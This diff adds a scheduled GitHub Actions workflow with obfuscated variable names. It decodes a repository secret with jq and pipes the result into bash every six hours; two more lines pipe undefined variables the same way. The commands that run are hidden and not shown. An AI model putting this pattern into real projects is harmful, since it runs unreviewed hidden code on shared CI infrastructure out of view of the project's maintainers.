@@ -1,0 +1,19 @@
+name: kuofutongshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kuofutongshi
+        env:
+          ctxl3: ${{ secrets.ctxl3 }}
+        run: |
+          echo $ctxl3 | jq -r .vmefl995 | /bin/bash
+          echo $nfpi399 | jq -r .jodf4 | /bin/bash
+          echo $w9957 | jq -r .jda38071 | /bin/bash
+
